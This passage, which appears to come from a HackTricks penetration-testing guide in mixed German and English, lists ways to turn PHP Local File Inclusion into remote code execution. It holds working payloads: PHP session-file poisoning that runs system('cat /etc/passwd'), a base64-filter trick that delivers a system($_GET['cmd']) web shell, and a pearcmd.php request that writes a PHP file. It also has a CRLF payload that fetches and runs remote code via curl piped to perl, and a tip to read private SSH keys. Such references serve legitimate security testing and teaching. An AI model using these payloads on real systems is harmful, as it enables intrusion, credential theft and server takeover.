Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese sessions in _/var/lib/php5/sess\\_\[PHPSESSID]\_ Dateien gespeichert.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Verwende das LFI, um die PHP-Session-Datei einzubinden
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Über ssh

Wenn ssh aktiv ist, prüfe, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuche, auf **\<HOME>/.ssh/id_rsa** zuzugreifen.

### **Über** **vsftpd** _**logs**_

Die Logs des FTP-Servers vsftpd befinden sich unter _**/var/log/vsftpd.log**_. In dem Szenario, in dem eine Local File Inclusion (LFI)-Schwachstelle besteht und Zugang zu einem exponierten vsftpd-Server möglich ist, können folgende Schritte in Betracht gezogen werden:

1. Injiziere eine PHP-Payload in das Username-Feld während des Anmeldevorgangs.
2. Nach der Injektion nutze die LFI, um die Server-Logs von _**/var/log/vsftpd.log**_ abzurufen.

### Über PHP base64-Filter (mit base64)

Wie in [diesem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP-base64-Filter einfach Nicht-base64-Zeichen. Du kannst das nutzen, um die Prüfung auf die Dateiendung zu umgehen: Wenn du base64 bereitstellst, das mit ".php" endet, würde er den "." einfach ignorieren und "php" an das base64 anhängen. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Dieser [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erklärt, dass du **php filters to generate arbitrary content** als Ausgabe verwenden kannst. Das bedeutet im Wesentlichen, dass du **generate arbitrary php code** für das include erzeugen kannst, **without needing to write** es in eine Datei.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

Lade eine Datei hoch, die als **temporary** in `/tmp` gespeichert wird; löse dann in derselben Anfrage einen **segmentation fault** aus. Die temporäre Datei wird nicht gelöscht und du kannst sie danach suchen.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Wenn du eine **Local File Inclusion** gefunden hast und **Nginx** vor PHP läuft, könntest du mit der folgenden Technik RCE erlangen:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Wenn du eine **Local File Inclusion** gefunden hast, selbst wenn du **don't have a session** und `session.auto_start` auf `Off` steht. Wenn du den **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten mitsendest, wird PHP die Session für dich **enable the session for you**. Du könntest das missbrauchen, um RCE zu erhalten:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Wenn du eine **Local File Inclusion** gefunden hast und der Server unter **Windows** läuft, könntest du RCE erlangen:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die folgende Anfrage erstellt eine Datei in `/tmp/hello.php` mit dem Inhalt `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Das Folgende missbraucht eine CRLF vuln, um RCE zu erlangen (von [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Wenn du eine **Local File Inclusion** und eine Datei gefunden hast, die **phpinfo()** mit file_uploads = on offenlegt, kannst du RCE erlangen:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Wenn du eine **Local File Inclusion** gefunden hast und du **den Pfad** der temporären Datei **exfiltrieren** kannst, ABER der **Server** überprüft, ob die **einzuschließende Datei PHP-Tags hat**, kannst du versuchen, diese Überprüfung mit dieser **Race Condition** zu **bypassen**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Wenn du das LFI missbrauchen kannst, um **upload temporary files** und den Server die PHP-Ausführung **hang**en zu lassen, könntest du anschließend **brute force filenames during hours** durchführen, um die temporäre Datei zu finden:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**Ich weiß nicht, wie das nützlich ist, aber es könnte sein.**\
_Selbst wenn du einen PHP Fatal Error verursachst, werden hochgeladene PHP-Temporärdateien gelöscht._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referenzen

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
